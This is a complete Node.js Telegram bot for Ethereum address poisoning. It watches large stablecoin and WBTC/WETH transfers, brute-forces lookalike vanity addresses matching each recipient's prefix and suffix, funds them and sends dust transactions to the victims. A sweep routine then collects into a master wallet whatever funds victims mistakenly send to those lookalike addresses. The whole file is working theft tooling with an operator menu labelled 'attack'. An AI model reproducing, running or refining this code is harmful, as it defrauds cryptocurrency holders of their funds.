const { ethers } = require("ethers");
const { Telegraf, Markup } = require('telegraf');
const mongoose = require('mongoose');
const axios = require('axios');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
require('dotenv').config();

// --- 1. Database Setup ---
mongoose.connect(process.env.MONGO_URI);
const Target = mongoose.model('Target', {
    address: { type: String, unique: true },
    isDusted: { type: Boolean, default: false },
    isAttacked: { type: Boolean, default: false },
    vanityAddress: String,
    vanityPrivateKey: String,
    asset: String,
    amount: Number,
    timestamp: { type: Date, default: Date.now }
});

// --- 2. Vanity Worker (With Feedback Logic) ---
if (!isMainThread) {
    const { prefix, suffix } = workerData;
    let attempts = 0;
    const startTime = Date.now();

    (async () => {
        while (true) {
            attempts++;
            const wallet = ethers.Wallet.createRandom();
            const addr = wallet.address.toLowerCase();
            
            // Send progress update every 20,000 attempts
            if (attempts % 20000 === 0) {
                const elapsed = (Date.now() - startTime) / 1000;
                const speed = Math.floor(attempts / elapsed);
                parentPort.postMessage({ 
                    type: 'progress', 
                    attempts, 
                    speed, 
                    current: addr 
                });
            }

            if (addr.startsWith("0x" + prefix.toLowerCase()) && addr.endsWith(suffix.toLowerCase())) {
                parentPort.postMessage({ 
                    type: 'success', 
                    address: wallet.address, 
                    privateKey: wallet.privateKey 
                });
                break;
            }
        }
    })();
    return;
}

// --- 3. Connections & Providers ---
const bot = new Telegraf(process.env.BOT_TOKEN);
const provider = new ethers.JsonRpcProvider(process.env.RPC_HTTP);
const masterWallet = new ethers.Wallet(process.env.MASTER_PRIVATE_KEY, provider);

let wsProvider;
let liveModeActive = false;
let userChatId = null;

const TOKENS = {
    USDT: { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", dec: 6 },
    USDC: { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", dec: 6 },
    WBTC: { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", dec: 8 },
    WETH: { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", dec: 18 }
};

function connectWS() {
    try {
        wsProvider = new ethers.WebSocketProvider(process.env.RPC_WSS);
        if (wsProvider.websocket) {
            wsProvider.websocket.onclose = () => setTimeout(connectWS, 5000);
        }
    } catch (e) { setTimeout(connectWS, 5000); }
}
connectWS();

// --- 4. Live Mode ---
function startLiveMode() {
    Object.entries(TOKENS).forEach(([symbol, info]) => {
        const contract = new ethers.Contract(info.addr, ["event Transfer(address indexed from, address indexed to, uint256 value)"], wsProvider);
        contract.on("Transfer", async (from, to, value) => {
            if (!liveModeActive || !userChatId) return;
            const amount = parseFloat(ethers.formatUnits(value, info.dec));
            if (amount >= 1000) {
                bot.telegram.sendMessage(userChatId, `🚨 **WHALE DETECTED**\n💰 ${amount.toLocaleString()} ${symbol}\n📍 \`${to}\`\n\nAttack: \`/attack ${to}\``, { parse_mode: 'Markdown' });
                await Target.findOneAndUpdate({ address: to.toLowerCase() }, { isDusted: true, amount, asset: symbol, timestamp: new Date() }, { upsert: true });
            }
        });
    });
}

// --- 5. Main Menus ---
const mainMenu = (ctx) => {
    const liveStatus = liveModeActive ? "🟢 Live Mode: ON" : "🔴 Live Mode: OFF";
    return ctx.reply("⚡ **Whale Control Center**", Markup.inlineKeyboard([
        [Markup.button.callback('🔍 Browse Live Database', 'scan_db_0')],
        [Markup.button.callback(liveStatus, 'toggle_live')],
        [Markup.button.callback('📜 View History', 'history_menu')],
        [Markup.button.callback('🧹 Manual Sweep All', 'manual_sweep')]
    ]));
};

bot.start((ctx) => { userChatId = ctx.chat.id; mainMenu(ctx); });

bot.action('toggle_live', (ctx) => {
    liveModeActive = !liveModeActive;
    if (liveModeActive) startLiveMode();
    ctx.answerCbQuery(`Live Mode ${liveModeActive ? 'ON' : 'OFF'}`);
    mainMenu(ctx);
});

// --- 6. Paginated DB Scanner ---
bot.action(/^scan_db_(\d+)$/, async (ctx) => {
    const page = parseInt(ctx.match[1]);
    const limit = 5;
    const skip = page * limit;

    const whales = await Target.find({ isDusted: true }).sort({ timestamp: -1 }).skip(skip).limit(limit);
    if (whales.length === 0) return ctx.answerCbQuery("No more records.");

    let msg = `🔍 **DATABASE EXPLORER (Page ${page + 1})**\n`;
    msg += `─────────────────────────\n\n`;

    whales.forEach(w => {
        const status = w.isAttacked ? "⚔️ ATTACKED" : "💎 FRESH";
        msg += `**STATUS:** \`${status}\`\n`;
        msg += `🐳 **WHALE (Target):** \`${w.address}\`\n`;
        msg += `💰 **Value:** ${w.amount.toLocaleString()} ${w.asset}\n`;
        
        if (w.vanityAddress) {
            msg += `🎭 **VANITY (Yours):** \`${w.vanityAddress}\`\n`;
        }
        
        msg += `▶️ *Cmd:* \`/attack ${w.address}\`\n`;
        msg += `─────────────────────────\n\n`;
    });

    const buttons = [
        page > 0 ? Markup.button.callback('⬅️ Prev', `scan_db_${page - 1}`) : null,
        Markup.button.callback('Next ➡️', `scan_db_${page + 1}`),
        Markup.button.callback('🏠 Menu', 'start_over')
    ].filter(Boolean);

    ctx.editMessageText(msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([buttons]) }).catch(() => {});
});

// --- 7. Manual Attack Logic (With Live Progress Updates) ---
bot.hears(/^\/attack (0x[a-fA-F0-9]{40})$/i, async (ctx) => {
    const target = ctx.match[1].toLowerCase();
    
    // Logic for 3 prefix (after 0x) and 4 suffix
    const prefix = target.substring(2, 5); // Index 2, 3, 4 (3 chars)
    const suffix = target.slice(-4);       // Last 4 chars

    const statusMsg = await ctx.reply(`🛰️ **Targeting:** \`${target}\`\n⚙️ Status: **Starting Engine...**`, { parse_mode: 'Markdown' });

    // Passing the 3/4 pattern to the worker
    const worker = new Worker(__filename, { workerData: { prefix, suffix } });
    let lastUiUpdate = Date.now();

    worker.on('message', async (msg) => {
        if (msg.type === 'progress') {
            if (Date.now() - lastUiUpdate > 3000) {
                await ctx.telegram.editMessageText(
                    ctx.chat.id, 
                    statusMsg.message_id, 
                    null, 
                    `🛰️ **Targeting:** \`${target}\` (3/4 Match)\n` +
                    `⚙️ Status: **Brute-forcing...**\n` +
                    `🔢 Attempts: \`${msg.attempts.toLocaleString()}\`\n` +
                    `⚡ Speed: \`${msg.speed} addr/s\``,
                    { parse_mode: 'Markdown' }
                ).catch(() => {});
                lastUiUpdate = Date.now();
            }
        } 
        
        if (msg.type === 'success') {
            await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null, `✅ **Vanity Found!**\nAddr: \`${msg.address}\`\n\nChecking Master Funds...`, { parse_mode: 'Markdown' });
            executeFunding(ctx, msg.address, msg.privateKey, target);
        }
    });

    worker.on('error', (err) => ctx.reply(`❌ Worker Error: ${err.message}`));
});

// New Helper function for Funding + Retry Logic
async function executeFunding(ctx, vanityAddress, vanityKey, whaleTarget) {
    const fundAmount = ethers.parseEther("0.0005");
    
    try {
        const masterBal = await provider.getBalance(masterWallet.address);
        
        if (masterBal < fundAmount) {
            const required = ethers.formatEther(fundAmount - masterBal);
            return ctx.reply(
                `⚠️ **FUNDING FAILED**\n\nInsufficient balance in Master Wallet.\nRequired: \`${fundAmount} ETH\`\nMissing: \`${required} ETH\`\n\nDeposit to: \`${masterWallet.address}\``, 
                Markup.inlineKeyboard([
                    [Markup.button.callback('🔄 Retry Funding', `retry_fund:${vanityAddress}:${vanityKey}:${whaleTarget}`)]
                ])
            );
        }

        const fundTx = await masterWallet.sendTransaction({ to: vanityAddress, value: fundAmount });
        await fundTx.wait();

        const vanitySigner = new ethers.Wallet(vanityKey, provider);
        // Total budget 0.0005 | Gas+Dust used 0.00035
        const dustTx = await vanitySigner.sendTransaction({ to: whaleTarget, value: ethers.parseEther("0.0001") });
        
        await Target.findOneAndUpdate(
            { address: whaleTarget }, 
            { isAttacked: true, vanityAddress, vanityPrivateKey: vanityKey }, 
            { upsert: true }
        );

        ctx.reply(`✨ **ATTACK COMPLETE**\n\n🎭 Vanity: \`${vanityAddress}\`\n🐳 Whale: \`${whaleTarget}\`\n🔗 [View Tx](https://etherscan.io/tx/${dustTx.hash})`, { parse_mode: 'Markdown' });
    } catch (e) {
        ctx.reply(`❌ Tx Error: ${e.message}`);
    }
}



// --- 8. Manual Sweep ---
bot.action('manual_sweep', async (ctx) => {
    ctx.answerCbQuery("Sweeping...");
    const vanities = await Target.find({ vanityPrivateKey: { $exists: true, $ne: null } });
    let report = "🧹 **SWEEP REPORT:**\n\n";
    for (const v of vanities) {
        try {
            const wallet = new ethers.Wallet(v.vanityPrivateKey, provider);
            const bal = await provider.getBalance(wallet.address);
            if (bal > ethers.parseEther("0.001")) {
                const fee = (await provider.getFeeData()).gasPrice * 21000n;
                await wallet.sendTransaction({ to: masterWallet.address, value: bal - fee });
                report += `✅ Swept from \`${wallet.address.slice(0,8)}...\`\n`;
            }
        } catch (e) { console.log(e.message); }
    }
    ctx.reply(report || "No balances found.", { parse_mode: 'Markdown' });
});

// --- 9. History ---
bot.action('history_menu', (ctx) => {
    ctx.editMessageText("📜 **Select View:**", Markup.inlineKeyboard([
        [Markup.button.callback('Whales Found', 'hist_found')],
        [Markup.button.callback('Whales Attacked', 'hist_attacked')],
        [Markup.button.callback('🔐 Vanity Status', 'hist_vanity')],
        [Markup.button.callback('⬅️ Back', 'start_over')]
    ]));
});

bot.action('hist_vanity', async (ctx) => {
    const items = await Target.find({ vanityAddress: { $exists: true } }).sort({ timestamp: -1 }).limit(10);
    let msg = "🔐 **VANITY ARCHIVE**\n\n";
    for (const i of items) {
        const bal = await provider.getBalance(i.vanityAddress);
        msg += `🎭 \`${i.vanityAddress}\`\n🐳 Matches: \`${i.address}\`\n💰 Bal: ${ethers.formatEther(bal)} ETH\n\n`;
    }
    ctx.reply(msg || "None.", { parse_mode: 'Markdown' });
});

bot.action(/hist_(found|attacked)/, async (ctx) => {
    const type = ctx.match[1];
    const query = type === 'found' ? { isDusted: true } : { isAttacked: true };
    const items = await Target.find(query).limit(10).sort({ timestamp: -1 });
    let msg = `📜 **${type.toUpperCase()}**\n\n`;
    items.forEach(i => msg += `• \`${i.address}\` | ${i.amount} ${i.asset}\n`);
    ctx.reply(msg || "Empty.", { parse_mode: 'Markdown' });
});

bot.action('start_over', (ctx) => mainMenu(ctx));

bot.launch().then(() => console.log("🤖 Bot with Feedback Online"));